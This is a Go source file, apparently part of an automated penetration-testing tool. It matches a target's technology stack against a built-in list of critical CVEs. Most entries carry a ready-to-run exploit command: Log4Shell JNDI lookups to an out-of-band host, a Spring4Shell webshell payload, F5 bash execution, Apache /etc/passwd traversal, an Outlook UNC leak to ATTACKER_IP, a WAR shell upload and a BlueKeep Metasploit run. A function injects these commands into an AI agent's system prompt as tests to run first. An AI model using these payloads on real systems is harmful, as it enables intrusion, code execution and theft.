package cve

import (
	"fmt"
	"strings"
	"sync"
	"time"
)

type CVEEntry struct {
	ID               string
	Description      string
	CVSS             float64
	Severity         string
	Affected         string
	PoCCommand       string
	NucleiTag        string
	References       []string
	CVSSVector       string
	EPSS             float64
	KEV              bool
	Published        time.Time
	LastModified     time.Time
	AffectedProducts []string
	AffectedVendors  []string
	TechHints        []string
	CWEs             []string
}

var corpus = []CVEEntry{
	{
		ID: "CVE-2021-44228", Description: "Log4Shell — JNDI injection in Apache Log4j2",
		CVSS: 10.0, Severity: "Critical", Affected: "log4j",
		PoCCommand: `curl -s -H 'X-Api-Version: ${jndi:ldap://OOB_HOST/a}' TARGET_URL`,
		NucleiTag:  "cve-2021-44228",
	},
	{
		ID: "CVE-2022-22965", Description: "Spring4Shell — RCE in Spring Framework",
		CVSS: 9.8, Severity: "Critical", Affected: "spring",
		PoCCommand: `curl -s -d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()' TARGET_URL`,
		NucleiTag:  "cve-2022-22965",
	},
	{
		ID: "CVE-2021-26855", Description: "ProxyLogon — Exchange Server SSRF",
		CVSS: 9.8, Severity: "Critical", Affected: "exchange",
		PoCCommand: `curl -k -s 'https://TARGET_URL/ecp/y.js' -H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'`,
		NucleiTag:  "CVE-2021-26855",
	},
	{
		ID: "CVE-2022-1388", Description: "F5 BIG-IP iControl REST auth bypass",
		CVSS: 9.8, Severity: "Critical", Affected: "big-ip",
		PoCCommand: `curl -sk -X POST https://TARGET_URL/mgmt/tm/util/bash -H 'Authorization: Basic YWRtaW46' -H 'X-F5-Auth-Token: a' -H 'Content-Type: application/json' -d '{"command":"run","utilCmdArgs":"-c id"}'`,
		NucleiTag:  "cve-2022-1388",
	},
	{
		ID: "CVE-2023-44487", Description: "HTTP/2 Rapid Reset DoS",
		CVSS: 7.5, Severity: "High", Affected: "http/2",
		PoCCommand: `# HTTP/2 Rapid Reset — use: h2load -n 1000 -c 100 -m 100 TARGET_URL`,
	},
	{
		ID: "CVE-2021-41773", Description: "Apache 2.4.49 path traversal / RCE",
		CVSS: 9.8, Severity: "Critical", Affected: "apache/2.4.49",
		PoCCommand: `curl -s --path-as-is 'TARGET_URL/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'`,
		NucleiTag:  "CVE-2021-41773",
	},
	{
		ID: "CVE-2022-0847", Description: "Dirty Pipe — Linux kernel LPE (5.8+)",
		CVSS: 7.8, Severity: "High", Affected: "linux kernel 5.",
		PoCCommand: `gcc -o /tmp/dirty_pipe CVE-2022-0847.c && /tmp/dirty_pipe /etc/passwd`,
	},
	{
		ID: "CVE-2023-23397", Description: "Microsoft Outlook NTLM hash leak",
		CVSS: 9.8, Severity: "Critical", Affected: "microsoft outlook",
		PoCCommand: `# Send calendar invite with UNC path: \\ATTACKER_IP\share\file.mp3`,
	},
	{
		ID: "CVE-2023-34362", Description: "MOVEit Transfer SQL injection RCE",
		CVSS: 9.8, Severity: "Critical", Affected: "moveit",
		PoCCommand: `sqlmap -u 'TARGET_URL/guestaccess.aspx' --data='LoginForm__Login=a&LoginForm__Password=b' --technique=T --batch --dbs`,
		NucleiTag:  "CVE-2023-34362",
	},
	{
		ID: "CVE-2021-21985", Description: "VMware vCenter RCE via vSAN Health Check",
		CVSS: 9.8, Severity: "Critical", Affected: "vcenter",
		PoCCommand: `curl -sk 'https://TARGET_URL/ui/vropspluginui/rest/services/uploadova' -X POST -F 'uploadFile=@shell.war'`,
	},
	{
		ID: "CVE-2019-0708", Description: "BlueKeep — RDP RCE (Windows 7/2008)",
		CVSS: 9.8, Severity: "Critical", Affected: "rdp",
		PoCCommand: `msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS TARGET_IP; run'`,
		NucleiTag:  "CVE-2019-0708",
	},
}

const (
	defaultCacheTTL    = 15 * time.Minute
	maxCacheSize       = 500
	cachePurgeInterval = 5 * time.Minute
)

type cacheEntry struct {
	results   []CVEEntry
	expiresAt time.Time
}

type correlationCache struct {
	mu      sync.RWMutex
	entries map[string]*cacheEntry
	maxSize int
	ttl     time.Duration
}

func newCorrelationCache(ttl time.Duration, maxSize int) *correlationCache {
	c := &correlationCache{
		entries: make(map[string]*cacheEntry),
		maxSize: maxSize,
		ttl:     ttl,
	}
	go c.purgeLoop()
	return c
}

func (c *correlationCache) get(key string) ([]CVEEntry, bool) {
	c.mu.RLock()
	defer c.mu.RUnlock()
	entry, ok := c.entries[key]
	if !ok {
		return nil, false
	}
	if time.Now().After(entry.expiresAt) {
		return nil, false
	}
	return entry.results, true
}

func (c *correlationCache) set(key string, results []CVEEntry) {
	c.mu.Lock()
	defer c.mu.Unlock()

	if len(c.entries) >= c.maxSize {
		c.evictOldest()
	}

	c.entries[key] = &cacheEntry{
		results:   results,
		expiresAt: time.Now().Add(c.ttl),
	}
}

func (c *correlationCache) evictOldest() {
	var oldestKey string
	var oldestTime time.Time
	first := true
	for k, v := range c.entries {
		if first || v.expiresAt.Before(oldestTime) {
			oldestKey = k
			oldestTime = v.expiresAt
			first = false
		}
	}
	if oldestKey != "" {
		delete(c.entries, oldestKey)
	}
}

func (c *correlationCache) purgeLoop() {
	ticker := time.NewTicker(cachePurgeInterval)
	defer ticker.Stop()
	for range ticker.C {
		c.mu.Lock()
		now := time.Now()
		for k, v := range c.entries {
			if now.After(v.expiresAt) {
				delete(c.entries, k)
			}
		}
		c.mu.Unlock()
	}
}

var globalCache = newCorrelationCache(defaultCacheTTL, maxCacheSize)

func Correlate(techStack []string) []CVEEntry {
	key := strings.ToLower(strings.Join(techStack, "|"))

	if results, ok := globalCache.get(key); ok {
		return results
	}

	results := correlateInternal(techStack)
	globalCache.set(key, results)
	return results
}

func correlateInternal(techStack []string) []CVEEntry {
	var matches []CVEEntry
	joined := strings.ToLower(strings.Join(techStack, " "))
	for _, entry := range corpus {
		if strings.Contains(joined, strings.ToLower(entry.Affected)) {
			matches = append(matches, entry)
		}
	}
	return matches
}

func CorrelateString(tech string) []CVEEntry {
	return Correlate([]string{tech})
}

func SystemPromptSection(matches []CVEEntry) string {
	if len(matches) == 0 {
		return ""
	}
	var sb strings.Builder
	sb.WriteString("\n=== CVE CORRELATION — TEST THESE FIRST ===\n")
	for _, c := range matches {
		sb.WriteString(fmt.Sprintf("[%s] CVSS=%.1f %s\n  PoC: %s\n", c.ID, c.CVSS, c.Description, c.PoCCommand))
		if c.NucleiTag != "" {
			sb.WriteString(fmt.Sprintf("  Nuclei: nuclei -u TARGET -id %s\n", c.NucleiTag))
		}
	}
	return sb.String()
}

func NucleiCVETags(techStack []string) []string {
	matches := Correlate(techStack)
	var tags []string
	for _, m := range matches {
		if m.NucleiTag != "" {
			tags = append(tags, m.NucleiTag)
		}
	}
	return tags
}

func RefreshCache() {
	globalCache.mu.Lock()
	defer globalCache.mu.Unlock()
	globalCache.entries = make(map[string]*cacheEntry)
}

func CacheStats() map[string]int {
	globalCache.mu.RLock()
	defer globalCache.mu.RUnlock()
	return map[string]int{
		"size":    len(globalCache.entries),
		"maxSize": globalCache.maxSize,
	}
}
